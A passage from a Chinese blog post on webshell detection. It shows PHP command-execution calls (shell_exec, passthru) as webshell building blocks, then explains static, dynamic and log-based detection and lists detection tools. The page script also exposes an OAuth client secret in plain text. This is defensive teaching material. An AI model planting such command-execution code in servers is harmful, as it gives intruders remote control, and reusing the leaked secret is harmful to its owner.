+
+
+
+<p><img src="/images/webshell/image-20200911111954897.png" alt="image-20200911111954897"></p>
+<h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h5><p>shell_exec()函数类似于exec()，但是，其整个输出结果为字符串。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo shell_exec(&quot;ls -al&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/webshell/image-20200911112228548.png" alt="image-20200911112228548"></p>
+<h5 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h5><p>passthru()执行一个命令并返回原始格式的输出.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">passthru(&quot;ls -l&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/webshell/image-20200911112637207.png" alt="image-20200911112637207"></p>
+<h4 id="检测手段"><a href="#检测手段" class="headerlink" title="检测手段"></a>检测手段</h4><h5 id="静态检测"><a href="#静态检测" class="headerlink" title="静态检测"></a>静态检测</h5><p>攻击者入侵服务器，使用Webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测。</p>
+<p>静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，且误报、漏报率会比较高，但如果规则完善，可以减低误报率，但是漏报率必定会有所提高。优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。</p>
+<p>缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。对于单站点的网站，用静态检测还是有很大好处，配合人工，能快速定位webshell，但是如果是一个成千上万站点的大型企业呢，这个时候再人肉那工作量可就大了。</p>
+<p>因此用这样一种思路：强弱特征。即把特征码分为强弱两种特征，强特征命中则必是webshell；弱特征由人工去判断。加入一种强特征，即把流行webshell用到的特征作为强特征重点监控，一旦出现这样的特征即可确认为webshell立即进行响应。要解决误报和漏报，就不能拘泥于代码级别了。</p>
+<p>同时结合文件系统。结合文件的属性来判断，比如apache是noboy启动的，webshell的属主必然也是nobody，如果我的Web目录无缘无故多了个nobody属主的文件，这里就有问题了。最理想的办法是需要制度和流程来建设一个web目录唯一发布入口，控制住这个入口，非法进来的Web文件自然可以发现。</p>
+<h5 id="动态检测"><a href="#动态检测" class="headerlink" title="动态检测"></a>动态检测</h5><p>Webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。</p>
+<p>Webshell传到服务器了，总要去执行它，Webshell执行时刻表现出来的特征，我们称为动态特征。Webshell通信是HTTP协议。只要我们把Webshell特有的HTTP请求/响应做成特征库，加到IDS里面去检测所有的HTTP请求就好了。</p>
+<p>webshell起来如果执行系统命令的话，会有进程。Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。</p>
+<h5 id="日志检测"><a href="#日志检测" class="headerlink" title="日志检测"></a>日志检测</h5><p>访问Webshell一般不会在系统日志中留下记录，但是会在网站的<code>web日志</code>中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。</p>
+<p>例如：一个平时是GET的请求改用POST请求并且返回代码为200、某个页面的访问者IP、访问时间具有规律性等。</p>
+<h4 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h4><p>以上介绍了部分检测手段，当然也少不了一些自动化工具(如下)，但是还需人工协助实现对Webshell检测的误报率。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/he1m4n6a/findWebshell">findWebshell</a></p>
+<p>一款本地检测Webshell工具，基本Webshell均可检测。可down到本地测试。检测脚本使用python编写。</p>
+<p><a target="_blank" rel="noopener" href="http://www.d99net.net/News.asp?id=47">D盾</a></p>
+<p>一款Windows客户端检测Webshell检测工具。较多人使用，具体使用下载本地测试即可。</p>
+<p><a target="_blank" rel="noopener" href="https://www.shellpub.com/">河马</a></p>
+<p>官网介绍：专注webshell查杀研究。拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p>
+<p><a target="_blank" rel="noopener" href="http://www.safedog.cn/">安全狗</a></p>
+<p>网站、服务器的检测，同时可以支持安全攻击防御，webshell检测等功能。</p>
+<h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;02aac12e459f</span><br><span class="line">http:&#x2F;&#x2F;blog.leanote.com&#x2F;post&#x2F;snowming&#x2F;2e1ab18dfa80</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;he1m4n6a&#x2F;p&#x2F;9245155.html</span><br></pre></td></tr></table></figure>
+
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#Webshell" >
+    <span class="tag-code">Webshell</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2020/09/05/XSS%E5%AD%A6%E4%B9%A0/">
+        <span class="nav-arrow">← </span>
+        
+          XSS学习
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2020/09/24/%E6%A0%91%E8%8E%93%E6%B4%BE/">
+        
+          树莓派
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">概述</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">分类</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">编程语言</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8A%9F%E8%83%BD"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">功能</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">常用函数</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#system"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">system</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#assert"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">assert</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#create-function"><span class="toc-nav-number">3.3.</span> <span class="toc-nav-text">create_function</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#call-user-func"><span class="toc-nav-number">3.4.</span> <span class="toc-nav-text">call_user_func</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#preg-replace-callback"><span class="toc-nav-number">3.5.</span> <span class="toc-nav-text">preg_replace_callback</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#file-put-contents"><span class="toc-nav-number">3.6.</span> <span class="toc-nav-text">file_put_contents</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#exec"><span class="toc-nav-number">3.7.</span> <span class="toc-nav-text">exec</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#shell-exec"><span class="toc-nav-number">3.8.</span> <span class="toc-nav-text">shell_exec</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#passthru"><span class="toc-nav-number">3.9.</span> <span class="toc-nav-text">passthru</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%A3%80%E6%B5%8B%E6%89%8B%E6%AE%B5"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">检测手段</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B"><span class="toc-nav-number">4.1.</span> <span class="toc-nav-text">静态检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8A%A8%E6%80%81%E6%A3%80%E6%B5%8B"><span class="toc-nav-number">4.2.</span> <span class="toc-nav-text">动态检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8B"><span class="toc-nav-number">4.3.</span> <span class="toc-nav-text">日志检测</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Tools"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">Tools</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Referer"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">Referer</span></a></li></ol>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2020/09/11/Webshell检测/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "si1ent";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "Webshell检测",
+        owner: "si1ent",
+        repo: "",
+        oauth: {
+          client_id: "0f87e490e00ee3fd87ef",
+          client_secret: "4a9d2b148e7971c2201ad12131ce8bf8159ccd2e"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    </p>
+    <p class="copyright">
+    皖ICP备19004273
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
